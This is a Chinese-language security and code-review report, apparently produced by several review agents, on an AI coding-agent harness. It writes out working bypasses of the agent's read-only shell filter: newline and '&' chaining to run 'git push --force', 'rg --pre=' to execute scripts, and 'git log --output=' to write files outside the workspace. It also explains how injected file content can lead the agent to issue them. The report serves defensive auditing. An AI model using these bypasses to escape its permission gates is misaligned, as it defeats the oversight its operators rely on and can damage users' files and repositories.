# DSH 多 Agent 交叉审查综合报告（第二轮）

> **审查对象**：`/Users/ze/Downloads/deepseek harness` @ HEAD `c525884`（分支 `codex/dsh-structural-hardening`，H3 收口后）
> **方法**：9 个只读子 Agent 按语义区块并行静态审查 + 主审对全部 P0/P1 逐条复核源码原文
> **覆盖量**：`src/` 121 文件 / 24,600 行 + `scripts/` 24 文件 / 6,300 行 + `tests/` 57 文件 / 9,056 行，共 ~40k 行
> **基线证据**：`tsc --noEmit --jsx react-jsx --lib ES2022,DOM,DOM.Iterable` → **exit 0**（8s，当前树类型干净）
> **实跑证据**（审查后期补做，见 §九）：**`pnpm gates` 实跑 → 21 绿 / 2 红（确定性）/ 2 未证，`GATES_EXIT=1`**——「23 道全绿」被证伪；完整 vitest 套件 **1 failed | 498 passed（56 文件 / 499 用例）**；5 条 P0/P1 用纯函数探针**动态复现成功**；两道红门均已用插桩/耗时反证定位根因，**并验证 2 行修复即可让门禁回到 `23/23 绿，exit 0`**；且已用单变量回退实验证明红门**不是 H3 引入的回归，而是自始存在**（全部实验后已还原，`git diff` 为空，工作树零残留）
> **发现统计**：**106 条**（P0 ×6 / P1 ×20 / P2 ×61 / P3 ×19），聚为 **8 条根因**。其中 **P0-1 含 2 个触发实例**（`\n` 与 `&`），**P0-6 是本报告最严重的一条**
> **局限**：静态审查为主。未运行 Electron 真实交互 / `pnpm build` 之外的打包链路；**门禁全量、测试套件与 5 条探针已实跑**。未复现的结论在 §九 逐条标注。

---

## 一、执行摘要

上一轮（`outputs/code-review-report-2026-09-12.md`，96 条）的 P0×3 与根因 1–4 的修复**主体已落地并经本轮复核确认**：`SHELL_FAMILY` 能力域识别、`judgeChain` deny 短路、frontmatter 原型污染封堵、`assertRealContainment` realpath 归属校验、`net.ts` stallGuard/withTimeout、`spawnTracked` 进程组回收——代码原文与注释一致，不是纸面修复。

但本轮 9 个区块的独立收敛指向一个共同结论：**修复是"点状"的，模式是"面状"的**。每一处修复都在它被发现的那条路径上生效，而**同一模式的其余实例未被回填**。于是本轮的 P0 全部是上一轮修复的"另一半"：

| 编号 | 严重度 | 一句话 | 位置 | 与上一轮的关系 |
|---|---|---|---|---|
| **P0-6** | **P0（最严重）** | **只读白名单只校验前导词、从不校验 flag** → `rg --pre=<脚本>` **任意命令执行**；`git log --output=<任意路径>` **任意文件写（含工作区外）**。已端到端复现 | `orchestrator.ts:132-147` | 新发现；建议**重做设计**而非打补丁 |
| **P0-1** | P0 | 只读 bash 硬闸不把换行/单与号当命令分隔符，`cat x\ngit push` 与 `cat x & git push` 均零审批执行（**2 个触发实例**） | `orchestrator.ts:130,156` | P0-2 的同源残留（deny 短路修了，链切分没修） |
| **P0-2** | P0 | worker 的自主会话用空参构造，项目级 deny/ask 规则对 worker **全表失效** | `orchestrator.ts:859-860` | P0-1 修复只覆盖主会话路径 |
| **P0-3** | P0（元） | 门禁 3 条断言恒真（目标串全仓不存在），M3 核心不变量"worker 上下文隔离"实际未被验证 | `agents-check.ts:291-292,590` | 根因 6 修复只抓了 `\|\|` 形态 |
| **P0-4a** | P0（元/记录失真） | **`test` 门确定性红**：`tests/m3c.test.ts` 依赖链用例 3/3 失败（每次 ~10.3s）；释放后环只等事件不等状态就绪，`?.()` 静默吞掉 | `tests/m3c.test.ts:407` | 缺陷本身是测试侧 1 行，但**结案推理不成立**（单次绿不能证伪确定性失败） |
| **P0-4b** | P0（元/记录失真） | **`agents-check` 门确定性红**：D2 快照早于等待 + `!` 崩溃，**中止后续约 190 条断言**（崩溃前只跑 59 条 ✅ / 宣称 250 条） | `agents-check.ts:305-317` | 同上，且这是"失败不短路"导致的**覆盖率静默损失** |

**立即处理清单**（按修复收益/成本排序，不是按严重度）：

| 优先级 | 动作 | 成本 | 收益 |
|---|---|---|---|
| **0a** | `tests/m3c.test.ts:407` 前补一行 `expect(await waitFor(() => hang.has("后环任务B"))).toBe(true);`（同文件 `:424` 已有正确先例） | **1 行** | 让 `test` 门回到绿 |
| **0b** | `scripts/agents-check.ts:305` 前补一行 `check(await waitForStreamEvent(logD, (e) => e.type === "approval_requested"), "D2a …");`（最小修）；完整修另加"`apr === undefined` 时短路并打印跳过条数"+ 去掉 `apr!` | **1 行 / ~8 行** | 让 `agents-check` 门回到绿，**并恢复 192 条断言的可执行性**（实测 59 → 251） |
| — | ↑ 两项合起来（各 1 行）：**2 道红门 → 0 道**，**实测 `pnpm gates` = 23/23 绿，exit 0** | **2 行** | **门禁不可信之前，其他修复都无法被验证**（元问题优先） |
| — | **另需补的机制**（比上面 2 行更重要）：门禁进 CI；`check` 增加"致命断言"变体（失败即 throw + 打印"后续 N 条已跳过"），杜绝"跑过了"与"跑完了"无法区分 | ~20 行 | 防止同类问题再潜伏 5 个提交 |
| 1 | `orchestrator.ts:156` 与 `rules.ts:118` 的链切分正则加 `\r?\n` **与 `&`** | 2 行 | 关掉 P0-1（2 个实例）+ P1 的 deny 击穿 |
| **1b** | **P0-6（最严重）**：`shell_ro` 的 `checkShellSegment` 增加参数面校验——**一律拒绝 `--xxx=yyy` 形式** + git 子命令 flag 白名单（至少拒 `--output`/`--ext-diff`）+ `rg` 去掉 `--pre`/`--pre-glob` | ~15 行（临时）／**重做设计（推荐）** | 关掉任意命令执行 + 任意文件写；**但治本要放弃字符串白名单** |
| 2 | `agents-check.ts:291-292,590` 三条断言改用真实存在的哨兵串（`:69` 的 `CANARY` 已定义未用） | 3 行 | 恢复"上下文隔离"这一 M3 核心不变量的可验证性 |
| 3 | `orchestrator.ts:859-860` 传入父 run 的 `rules` / `sandboxAvailable` | ~10 行 | 关掉 P0-2 |
| 4 | `events/index.ts:394-397` 逐行 try/catch + 坏行降级 | ~10 行 | 消除"一行坏 → 整会话永久不可打开" |
| 5 | `assertion-health.ts:73-81` 按断言函数**声明签名**定位条件实参 | ~20 行 | 恢复体检网的覆盖面（元问题） |
| 6 | 4 处 `spawn` 补 `env: sanitizedEnv()`（`worktree.ts:42`、`ripgrep.ts:35`、`glob.ts:19`、`map/build.ts:42`） | 4 行 | 关掉 BYOK 明文经 git hooks 外泄 |

---

## 二、严重度总览

| 区块 | P0 | P1 | P2 | P3 | 合计 | 强度定性 |
|---|---|---|---|---|---|---|
| A 循环内核（loop/compaction/prune/sidechat/glm/worktree/events） | 0 | 2 | 6 | 2 | **10** | 骨架优秀，长会话与损坏输入路径欠打磨 |
| B 多 Agent 编排内核（orchestrator 2292 行） | 1 | 2 | 6 | 1 | **10** | 结构性约束扎实，权限边界有缺口 |
| C 工具 / 权限门 / 模型适配 / 网络 | 2 | 4 | 7 | 0 | **13** | 主路径已收口，**只读白名单这个设计方向本身不成立**（P0-1 + P0-6） |
| D 主进程 / IPC / 沙箱 / 商业化 | 0 | 2 | 8 | 2 | **12** | 全项目最克制的一块，无 P0 |
| E 地图 / 记忆 / 插件与 MCP / 安全扫描 | 0 | 3 | 6 | 2 | **11** | 工程化程度高，信任模型有结构性缺口 |
| F 渲染层核心（状态 / 投影 / 入口） | 0 | 2 | 7 | 3 | **12** | 设计骨架干净，三处新加固均"部分闭环" |
| G 面板 / 卡片 / UI 组件 | 0 | 0 | 7 | 5 | **12** | 成熟度最高的一块，零 P0/P1 |
| H 工程门禁脚本 | 2 | 3 | 6 | 2 | **13** | 修复方向正确；但 **`agents-check` 门确定性红**（P0-4b） |
| I 测试套件 / 构建打包 / 依赖 | 1 | 2 | 8 | 2 | **13** | 测试质量高于同规模项目，但 **`test` 门确定性红**（P0-4a） |
| **合计** | **6** | **20** | **61** | **19** | **106** | |

**交叉验证强度**：根因 4 被 3 个区块（C/D/E）独立发现；根因 1、3、5、7 各被 2–5 个区块独立发现。多 Agent 互不知情下的收敛，是"该修根因而非逐个打补丁"的最强论据。

---

## 三、跨区块系统性问题（根因聚类）

### 根因 1：换行符未纳入"命令链切分"——同一条修复只做了一半（2 区块）

**识别信号**：同一个仓里，一处代码显式做了换行归一，另一处没有。

`orchestrator.ts:184-185` 的注释写得很清楚，说明团队**知道这个陷阱**：

```
// H2（审查 B-1）：拦截按「有效二进制」判定，不再只认段首字面 `git`——
// 绝对路径（/usr/bin/git）、exec 包装（command/env/…）、换行分隔、shell -c 内嵌都要拦。
```

但同一文件 50 行之前的只读硬闸没做（`:130` 的 `SHELL_WRITE_META` 不含 `\n`，`:156` 的切分正则不含 `\n`），`src/permissions/rules.ts:118` 的 `CHAIN_SPLIT` 也没做。**后果**：

- `cat x\ngit push --force` → 整段首词是 `cat` → 通过只读白名单 → `run_shell` 原样执行两条命令（P0-1）
- `echo hi\ngit push --force` → 归一成一个段且不以 `git push` 开头 → 命中不了 deny → auto 档放行（P1）

grep 验证：

```
$ grep -n "CHAIN_SPLIT\|SHELL_WRITE_META" src/permissions/rules.ts src/agent/orchestrator.ts
rules.ts:118:const CHAIN_SPLIT = /\s*(?:&&|\|\||[;|])\s*/;          ← 无 \n
orchestrator.ts:130:const SHELL_WRITE_META = /[<>`]|\$\(|\$\{|\+\+|<<<|\(\(/;   ← 无 \n
orchestrator.ts:156:const segments = command.split(/&&|\|\||;|\|/);            ← 无 \n
```

### 根因 2：能力域识别只在新路径落地，旧副本未清理（1 区块，但与 P0-1 同源）

上一轮 P0-1 的正确修法是"按**能力域**而非字面工具名识别 shell"。修复落在了 `autonomy.ts:89-94` 的 `SIDE_EFFECT_TOOLS`，但 `permissions/index.ts:86-88` 的**私有同名函数**没删：

```
// src/permissions/index.ts:86-88（仍是字面名版本）
function isSideEffectTool(tool: ToolName): boolean {
  return tool === "write_file" || tool === "edit_file" || tool === "run_shell";
}
```

于是走 `checkPermission`/`gate`/`denyReason` 的 loop 路径对 `shell_rw` 不生效。**这是"同一概念两份实现"的典型腐化**，与根因 1 共享同一病理：修了 A 忘了 B。

### 根因 3：realpath 校验只用在一条路径上（2 区块独立发现）

上一轮根因 3 的修复（`assertRealContainment`）本身质量很高——沿现存祖先链 realpath、对 workspace 本身是软链的场景零行为变化、测试覆盖三态。但**它的兄弟函数没有对齐**：

- `base.ts:105-109` `assertNotAgentArea` 仍是纯词法：`rel.split(/[\\/]/).includes(".agent")` —— 软链 `foo -> .agent` 即可写 `lsp.json`（任意 command → RCE 面）或 `permissions.json`（跨会话提权）
- `sidechat.ts:196-198` `readAtRef` 只做 `resolve/relative` 词法包含 —— 工作区内指向 `~/.ssh/id_rsa` 的软链被 `@` 引用后内容直进模型上下文并发往外部 provider

**两个区块（A 与 C）在互不知情的情况下分别指出同一模式**：realpath 只覆盖了"内容工具写路径"这一条，其余"读路径 / 系统区判定"仍停留在词法层。

### 根因 4：资源回收只回填了新建的 spawn 点，存量 spawn 点未覆盖（**3 区块独立发现**）

上一轮 P1-2 引入 `spawnTracked`/`killGroup`（`detached` + 负 pid 杀整树）与 `sanitizedEnv`。grep 显示回填是**不完整**的：

```
$ grep -rn "sanitizedEnv" src/ --include="*.ts"
src/tools/run_shell.ts:47     ✅
src/agent/verify.ts:57        ✅
src/main/sandbox.ts:55        ✅
src/tools/lsp.ts:273          ✅（但见下）
→ 缺失：worktree.ts:42 / ripgrep.ts:35 / glob.ts:19 / map/build.ts:42
```

这 4 处 `spawn` 不传 `env` 即继承 `process.env`，而 `injectStoredProviderKey`（`provider-keys.ts:5` 注释自述）把**明文 BYOK key** 写进了 `process.env.M0_API_KEY`。git 会在工作区仓库执行 `.git/hooks/*` —— 克隆一个带恶意 hook 的仓库即可读走明文 key。**三个区块（C 报 lsp、D 报 4 处 env、E 报 MCP）从不同角度指向同一件事：进程卫生纪律没有机械化（lint/门禁）保障。**

### 根因 5：无界增长 + 全量重算——修了热点，未修模式（**5 区块独立发现**）

上一轮根因 5 的修复（`buildPruneIndex` O(n²)→O(n)、渲染层帧批量 dispatch）都是**单点**优化。本轮 5 个区块各自找到同类残留：

| 位置 | 形态 |
|---|---|
| `compaction.ts:175-176` | `Math.max(-1, ...events.map(...))` —— 全量数组展开为函数实参，长会话抛 `RangeError: Maximum call stack size exceeded` |
| `compaction.ts:140-144,182` | `merged.find()` / `units.find()` 嵌套扫描，O(n·m) |
| `glm-session.ts:317-326`、`sidechat.ts:231-236` | 每轮 `replay(logPath)` 全量读盘 + `projectContext` 全量投影 → 整会话 O(n²) |
| `orchestrator.ts:2250,2267` | worker provider 每轮全量重投影 + 压缩判定再投影一次 |
| `scheduler.ts:373-378,757-798` | `journalKeys`/`journalByTask`/`completions` 无界增长，`snapshot()` 对全部历史逐条投影（跨重启每条至少一次 `stat`） |
| `map/build.ts:210-222` | 最多 400 文件全串行 `readFile` + tree-sitter 解析，循环内每次 `await import("node:fs/promises")` |
| `store.ts:49` + `main.tsx:758-767` | `events` 无界追加 + 7 个投影每次 state 变更全量 O(n) 重算（帧批量只降常数不降阶） |

**注意**：H3-P2 的帧批量 dispatch 把 per-delta 降为 per-frame，是**正确的工程动作**，但渐进复杂度仍是 O(n²)。测试全绿不代表问题消失——这正说明"没有性能门禁"是一个结构缺口。

### 根因 6：门禁判据强度——修了 3 条已知的，未修"体检网"的覆盖面（1 区块，影响全局）

H 轮修复（AST 级析取扫描 + 清单漂移护栏 + UNVERIFIED 标记）方向正确，主体有效。但**体检网只认"断言函数第一实参里出现 `||`"这一种形态**，本轮新增/残留的弱断言全部落在网外：

| 绕过形式 | 位置 | 为何扫不到 |
|---|---|---|
| 恒真否定式（目标串全仓不存在） | `agents-check.ts:291-292,590` | 无 `\|\|`、无 `true` 字面 |
| 副作用喂成恒真（先 push 再断言 length>0） | `plugins-check.ts:540-541` | 同上 |
| label-first 签名（条件在第二实参） | `tools-check.ts:22`、`prune-check.ts:20`、`map-check.ts:17` | 体检只取 `arguments[0]` |
| 未证记账空实现 | `compaction-check.ts:30,348` | `unverified` 数组从不 push，恒打印 `UNVERIFIED=0` |
| `--only` 空集判"全部通过" | `gates.ts:68-73,135-137` | 循环零次 → `failed=[]` → exit 0 |

**这是元问题**：只要假绿面在，其余所有修复都无法被门禁验证。按技能流程的优先级规则，它排在多数 P2 之前。

### 根因 7：新加固只覆盖"主路径"，迟到/旁路路径未纳入（**3 区块独立发现**）

H3-P1/P2/P3 与 H2-④ 的四处加固有一个共同形状：**检查放在入口，`await` 之后不复查**。

| 位置 | 形态 |
|---|---|
| `orchestrator.ts:777,889-890` | 只在入口查 `aborted`；注册监听后未补 `if (signal.aborted) abort()` |
| `orchestrator.ts:780,885` | 并发上限 check-then-act，判定与登记之间隔着多个 await |
| `orchestrator.ts:1480` | `armStuckSilence` 未在 `runLoop` 前武装 → worker 首个模型调用挂起时静默规则永不触发 |
| `ask-gate.ts:53-76` | `AskGate.request` 未接 signal（对比 `gates.ts:37` 已接） |
| `main.tsx:939-949` | `agent:event` 完全未参与 `sessionSeq` 守卫（最长寿的迟到路径） |
| `main.tsx:843-851,925-936` | 会话 `reset` 不收束也不清空 delta 缓冲 |

### 根因 8：把"事件已发出"当作"状态已就绪"，且失败后不短路（**2 门独立同型，实跑发现**）

这是**只有实跑才能暴露**的一条根因（静态阶段我只把它当作"测试用了固定 sleep"的 P1）。

| 位置 | 形态 | 失败放大器 |
|---|---|---|
| `tests/m3c.test.ts:406-407` | 等到 `agent_spawned` 计数为 2 就立刻 `hang.get(后环)?.()` —— 事件落流**严格早于**后环模型登记释放函数 | `?.()` → 静默 no-op |
| `scripts/agents-check.ts:305-306` vs `:313` | `:305` 取 `approval_requested` 快照，`:313` 才做等待 —— **等待用对了，但用晚了，且不重取快照** | `!` → `TypeError` 崩溃，中止后续约 190 条断言 |
| `scripts/agents-check.ts:313` | `await waitForStreamEvent(...)` 的返回值被**忽略**（超时返回 `false` 不抛错） | 超时静默 |
| `scripts/agents-check.ts` 的 `check` | 失败只累加计数、不短路 | 坏值继续被使用 |

**共同形状**：两处都已存在**正确的等待原语**（`waitFor` / `waitForStreamEvent`），但用在了错误的位置或错误的时机；再加上四种"把错误吞掉或放大"的写法（`?.()` 静默 / `!` 崩溃 / 返回值忽略 / 失败不短路），把"未就绪"变成了静默或崩溃。

**为什么归为一条根因**：`tests/` 与 `scripts/` 是两套互不相干的验收代码，由不同轮次写成，却犯了同一个错误——说明这不是笔误，而是**这套验收代码的系统性写法问题**。且它直接决定门禁可信度，属元问题层。

**修复模式（三选一，建议全上）**：
1. 等待**状态**而非等待**事件**：`waitFor(() => hang.has(id))` 而非 `waitFor(() => spawned.length === 2)`。
2. 等待的结果必须**被断言**：`check(await waitForStreamEvent(...), "...")`。
3. 致命前置失败后**显式短路并打印"后续 N 条已跳过"**，让覆盖率损失可见。

### 根因 9：把「命令名只读」当作「命令只读」——只读白名单从不校验参数面（**本轮最严重**）

**识别信号**：一个"只读/安全"过滤器只检查命令名，而命令名相同、参数不同可以执行任意代码或写任意文件。

`checkShellSegment`（`orchestrator.ts:132-147`）拿到 `words` 后只比较 `words[0]`（或 git 的 `words[1]`），**`words.slice(2)` 与 `words.slice(1)` 一律不看**。于是：

| 白名单命令 | 危险参数 | 后果 |
|---|---|---|
| `rg` | `--pre=<cmd>` | 对每个文件先执行 `<cmd>` → **任意命令执行** |
| `git log/diff/show` | `--output=<path>` | 把输出写到任意路径 → **任意文件写（含工作区外）** |
| `git log/diff/show` | `--ext-diff` | 调用外部 diff 驱动 → 执行面 |

**这一条比根因 1 更根本**：根因 1 是"某个分隔符没归一化"（修法明确），根因 9 是"**校验面本身选错了**"——只要还在用"命令名白名单"这个模型，就永远有下一个危险 flag。本轮实测的 6 条危险 flag **全部放行**（见 §9.10）。

**同一根因的姊妹形态**（本项目内已出现过）：
- `permissions/index.ts` 的 `isSideEffectTool` 按**字面工具名**判定（根因 2）——"名字对了就安全"。
- `plugins-check.ts:204-207` 的"三家适配器互不 import"用**文件名字符串**判定——"名字没出现就安全"。

**修复方向（三选一，按推荐度排序）**：
1. **放弃字符串白名单，改为原生只读工具**（`rg`/`glob`/`read_file` 已是独立工具）。这是唯一能终止这类缺陷的方向。
2. 若必须保留：**走 Seatbelt 沙箱**（只读挂载 + 禁 exec + 禁写），把"只读"从**字符串判断**变成**内核强制**。
3. 最低限度：白名单升级为「命令 + 允许 flag 集合」，并**一律拒绝 `--xxx=yyy` 形式**与未知 flag。

---

## 四、P0 问题详情（P0-1 / P0-2 / P0-4a / P0-4b / P0-6 已动态或端到端复现；P0-3 由全仓 grep 反证；全部经主审逐条复核源码）

### P0-1｜只读 bash 硬闸被换行与单与号击穿：`cat x\ngit push` / `cat x & git push` 零审批执行

**位置**：`src/agent/orchestrator.ts:130`、`:156`、`:165-175`

**主审复核证据**（原文）：

```ts
// :130
const SHELL_WRITE_META = /[<>`]|\$\(|\$\{|\+\+|<<<|\(\(/;

// :150-162
export function isReadOnlyShellCommand(command: string): { ok: boolean; why?: string } {
  if (typeof command !== "string" || command.trim() === "") return { ok: false, why: "空命令" };
  if (SHELL_WRITE_META.test(command)) {
    return { ok: false, why: "含重定向/命令替换/heredoc 等写面元字符（只读 bash 一票否决）" };
  }
  // 链段切分：; && || | —— 每段都必须落在白名单内（cat x | wc -l 允许；cat x | tee out 拒绝）
  const segments = command.split(/&&|\|\||;|\|/);       // ← 不含 \n
  for (const seg of segments) {
    const why = checkShellSegment(seg);
    if (why) return { ok: false, why };
  }
  return { ok: true };
}

// :165-175 —— shell_ro 通过静态过滤后「直连 run_shell 原始实现（不过主会话工具门）」
export const shell_ro: Tool = {
  name: "shell_ro",
  async run(args, ctx): Promise<ToolResult> {
    const command = typeof args.command === "string" ? args.command : "";
    const gate = isReadOnlyShellCommand(command);
    if (!gate.ok) { return { ok: false, output: "[read-only] 只读 bash 静态过滤拒绝：" + (gate.why ?? "未知原因") }; }
    return await run_shell.run({ command }, ctx);        // ← 原样执行
  },
};
```

**攻击链**：`"cat x\ngit push --force origin main"` → `split(/&&|\|\||;|\|/)` 切出**一段** → `checkShellSegment` 取 `words[0] = "cat"` ∈ `READONLY_SHELL_COMMANDS` → `ok: true` → `run_shell.run` 交给 bash 执行两行。

**可达性**：worker（`WORKER_TOOL_TABLE:85` 含 `shell_ro`）读取工作区文件时，文件内容中的注入可诱导模型构造该命令。**不依赖远程**，但依赖模型/不可信文件内容，属"不可信输入触达"。

**影响**：声称的"只读 bash 硬闸"（§4.4.6）失效。且 `shell_ro` 不在威胁表（`hasThreatTableSurface` 返回 false），外层 `evaluate` 不会兜底 → 零审批。

**修复**：`isReadOnlyShellCommand` 入口先 `command.replace(/\r?\n/g, ";")`（与 `interceptDestructiveGit` 同口径）；补否定式单测 `isReadOnlyShellCommand("cat a\ngit push")` 必须 `ok:false`。

---

### P0-6｜只读白名单只校验「前导词」、从不校验 flag → 任意命令执行 + 任意文件写（已端到端复现）

**位置**：`src/agent/orchestrator.ts:132-147`（`checkShellSegment` 只取 `words[0]`/`words[1]`）、`:122-128`（白名单本身）

**主审复核证据**（原文）：

```ts
// :132-147 —— 只取前两个词，其余参数一律不校验
function checkShellSegment(segment: string): string | null {
  const words = segment.trim().split(/\s+/).filter((w) => w !== "");
  if (words.length === 0) return "空命令段";
  const head = words[0]!;
  if (head === "git") {
    const sub = words[1] ?? "";
    if (!READONLY_GIT_SUBCOMMANDS.includes(sub)) {
      return `git ${sub} 不在只读白名单（…）`;
    }
    return null;                       // ← 之后所有 flag / 参数都不再看
  }
  if (!READONLY_SHELL_COMMANDS.includes(head)) {
    return `${head} 不在只读白名单（…）`;
  }
  return null;                         // ← 同上
}
```

`shell_ro` 通过过滤后**直连 `run_shell` 原始实现**，而 `run_shell` 是 `spawnTracked("bash", ["-c", command], …)`（`src/tools/run_shell.ts:45`）——**整串交给 bash**。

**端到端复现（主审实跑，全部无害载荷）**：

| 逃逸 | 过滤判定 | 实际后果（实测） |
|---|---|---|
| `rg --pre=/tmp/audit-pre.sh 'AUDIT_PRE_EXECUTED' package.json` | ✅ **放行** | **rg 执行了我写的任意脚本**——输出 `AUDIT_PRE_EXECUTED package.json` |
| `git log --output=/tmp/audit-pwned.txt -1` | ✅ **放行** | **文件被创建，567 字节**（含 git log 内容）——**写出工作区外**，`shell_ro` 的"只读"语义被彻底绕过 |
| `git diff --output=/tmp/audit-pwned.diff HEAD` | ✅ **放行** | 文件被创建（0 字节，diff 为空） |
| `git log --ext-diff` / `git diff --ext-diff` / `git show --ext-diff` | ✅ **放行** | 外部 diff 驱动执行面（需配合仓库 config，属潜在面） |

**为什么这是独立于 P0-1 的缺陷**：P0-1 是"**分隔符**没切干净"，修法是归一化分隔符；P0-6 是"**参数面**从不校验"，归一化分隔符**完全修不掉它**——`rg --pre=…` 与 `git log --output=…` 都是**单条合法命令、无任何分隔符**。两者需要不同的修复。

**可达性**：worker（read mode 就有 `shell_ro`，见 `WORKER_TOOL_TABLE:85`）读取工作区/克隆来的仓库内容时，仓库里一个自带的脚本 + 一条 `rg --pre=./script` 即构成"不可信内容 → 任意代码执行"。**不需要远程，不需要审批。**

**影响（本报告最严重的一条）**：
1. **任意命令执行**：`rg` 在白名单里，而 `--pre` 的语义就是"对每个文件先跑这个命令"——白名单把一个可执行任意命令的工具当成只读工具放行了。
2. **任意文件写 + 工作区包含性失效**：`git log --output=<path>` 可写**任意可写路径**（含 `~/.ssh/authorized_keys` 这类）。`shell_ro` 号称"只读"，而权限层的 workspace 包含性校验**在 shell 面根本没有**——它只对 `read_file`/`write_file`/`edit_file` 等**内容工具**生效（`base.ts` 的 `assertRealContainment`）。
3. 三条独立逃逸（P0-1 分隔符 / P0-6 执行 flag / P0-6 写 flag）都指向同一句自我描述：「只读 bash 静态过滤（§4.4.6：显式白名单命令集，其余拒绝）」「fail-closed 拒绝」。**这个描述与实际能力不符。**

**修复（建议重做，而非打补丁）**：

```ts
// ① 最低限度：白名单改成「命令 + 允许的 flag 集合」，flag 不在集合内即拒绝
const READONLY_FLAGS: Record<string, ReadonlySet<string>> = {
  ls: new Set(["-l", "-a", "-la", "-R"]), cat: new Set([]), /* … */ rg: new Set(["-n", "-i", "-l", "-c"]),
};
// ② 一律拒绝带 `=` 的长 flag（--xxx=yyy 是 flag 注入的通用形态）
if (words.slice(1).some((w) => w.startsWith("--") && w.includes("="))) return "长 flag 赋值形式一律拒绝（只读面不需要）";
// ③ git 只读子命令同样加 flag 白名单（至少拒绝 --output / --ext-diff / --exec-path）
```

**更彻底的方向（推荐）**：**放弃 `shell_ro` 的字符串白名单，改为原生只读工具**。`rg`/`glob`/`read_file` 已经是独立工具（`src/tools/ripgrep.ts`/`glob.ts`/`read_file.ts`），`shell_ro` 想提供的"任意只读命令"价值有限，而它带来的是**一个永远修不完的解析面**。若必须保留，则应至少：走 Seatbelt 沙箱（只读挂载 + 禁止 exec）+ 输出/写入面独立审计。本报告认为**"白名单字符串过滤"这个设计方向本身不成立**——P0-1 与 P0-6 是它的第 1 次和第 2 次失败，而它还会继续失败。

**这是本轮最严重的一条发现**，也是唯一一条建议**重新设计**而非修补的。

---

### P0-2｜worker 权限规则全表失效：项目级 deny/ask 对 worker 静默不生效

**位置**：`src/agent/orchestrator.ts:859-860`、`:2196`；`src/permissions/autonomy.ts:66-78`

**主审复核证据**（原文）：

```ts
// orchestrator.ts:848-861 —— WorkerHandle 构造
const handle: WorkerHandle = {
  agentId,
  ...
  tier,
  ...
  autonomy: newAutonomySession(tier),                              // ← 无 init
  toolAutonomy: newAutonomySession(mode === "write" ? "auto" : tier), // ← 无 init
  ...
};

// autonomy.ts:66-78 —— 签名本身支持 rules / sandboxAvailable，但调用方没传
export function newAutonomySession(
  mode: PermissionMode,
  init: { rules?: PermissionRule[]; sessionScopes?: Set<string>; sandboxAvailable?: boolean | null } = {},
): AutonomySession {
  return {
    mode,
    rules: init.rules ?? [],              // ← 恒为空数组
    sessionScopes: init.sessionScopes ?? new Set<string>(),
    sandboxAvailable: init.sandboxAvailable ?? null,   // ← 恒为 null
  };

// orchestrator.ts:2192-2196 —— 注释宣称「档位/风险/规则全生效」
/** worker 工具门：evaluate 管线（档位/风险/规则全生效）→ ask 走 worker 审批协议（与 turn 解耦）。 */
function gatedWorkerTool(name, inner, w, orch, opts = {}): Tool {
  return { name, async run(args, ctx) {
    const d: EvaluateDecision = evaluate(name as never, args, opts.autonomy ?? w.autonomy);
```

**影响**：主会话 `.agent/permissions.json` 里的 deny/ask 规则对 worker **全部失效**。按 `rules.ts:10` 的语义，读/写类工具只能写**裸工具名条目**（`deny read_file`），shell 类可写 pattern（`deny run_shell:git push`）——**两类都被实测证实失效**（见 §9.2）：同一个工具调用，主会话得 `deny`、worker 得 `approve`。worker 因此可读主会话被禁读的文件并把内容回传模型。沙箱通道也恒为 `NONE`（`sandboxAvailable: null`），沙箱降级时不被强制送审。**注释与实现直接矛盾**，属"安全资产纪律"（§16.8）被破坏。

**修复**：`OrchestratorOptions` 增加 `rules` / `sandboxAvailable`，`runAgent` 把已加载的规则与 `opts.sandbox.available` 传入，worker 两个会话都按父 run 口径构造。

---

### P0-3｜门禁 3 条断言恒真：M3 核心不变量"worker 上下文隔离"实际未被验证（元问题）

**位置**：`scripts/agents-check.ts:291-292`、`:590`（`CANARY` 定义在 `:69`）

**主审复核证据**（原文 + 全仓反查）：

```ts
// :69 —— 哨兵常量已定义
const CANARY = "CANARY-MAIN-CONTEXT-主会话哨兵-不应进worker上下文";

// :291-292 —— 断言的却是另一个字符串
check(!events.some((e) => e.type === "user_message" && (e as { content: string }).content.includes("getCompletedCount 的统计")), "C9b 主上下文零 canary（worker 上下文隔离的另一面：worker 事件不回流）");
check(events.filter((e) => e.type === "assistant_message").every((e) => !(e as { content: string }).content.includes("getCompletedCount 的统计")), "C9c worker 报告不以 assistant 正文进主流（只有 agent_result/合成 tool_result 形态）");

// :590
check(!events.some((e) => e.type === "tool_result" && (e as { output: string }).output.includes("main 分支已被 worker 改写")), "I8b 主 checkout 零 worker 写痕（拦截在执行前）");
```

全仓反查（`--include="*.ts" --include="*.tsx" --include="*.jsonl" --include="*.md"`，排除 `node_modules`）：

```
$ grep -rn "getCompletedCount 的统计" .
./scripts/agents-check.ts:291   ← 只有断言自身
./scripts/agents-check.ts:292   ← 只有断言自身

$ grep -rn "main 分支已被 worker 改写" .
./scripts/agents-check.ts:590   ← 只有断言自身

$ grep -rn "CANARY" scripts/agents-check.ts
69:const CANARY = "CANARY-MAIN-CONTEXT-主会话哨兵-不应进worker上下文";   ← 定义后从未使用
654/662: "M3B-CHECK-MEMORY-CANARY"                                       ← 另一个串
```

**影响**：C9b/C9c/I8b 三条断言**永不失败**。它们声称验证的"M3 核心不变量：worker 事件不回流主上下文 / worker 不写主 checkout"，在门禁层面**实际处于未验证状态**——而 `agents-check` 是全项目最大的门（1230 行）。这是"元问题优先"原则的直接体现：假绿掩盖的是别的区块的 P0/P1 是否真被拦住。

**修复**：改用 `CANARY`（`:69` 已定义、worker 剧本里嵌入）；并把"断言目标串必须出现在某个 fixture/源码中"做成体检规则（grep 反查）。

---

### P0-4｜门禁真实基线：**2 道门确定性红**，「23 道全绿」被证伪（元问题/记录失真）

**位置**：`tests/m3c.test.ts:407`（P0-4a）、`scripts/agents-check.ts:305-317`（P0-4b）；记录冲突在 `AGENTS.md:46`、`PROGRESS.md:880`

**门禁真实基线（主审实跑 `pnpm gates`，7m44s）**：

```
  ✅ typecheck    ✅ e2e          ✅ ipc:check    ✅ sandbox:check  ✅ build
  ✅ fork-check   ✅ gate-check   ✅ autonomy-check  ✅ compaction-check  ✅ panels-check
  ✅ tools-check  ✅ map-check    ✅ prune-check  ✅ providers-check   ✅ provider:check
  ✅ memory-check ✅ plugins-check ✅ sidechat-check ✅ security-check ✅ schedule-check
  ✅ commercial-check
  ❌ test          exit=1  106857ms
  ❌ agents-check  exit=1    1926ms
  断言体检：✅ 零命中      清单漂移校验：✅ 一致
  ⚠️  未证 2 项（连网/凭据限制）
  GATES_EXIT=1
```

| | 宣称（`AGENTS.md:46`） | 实测 |
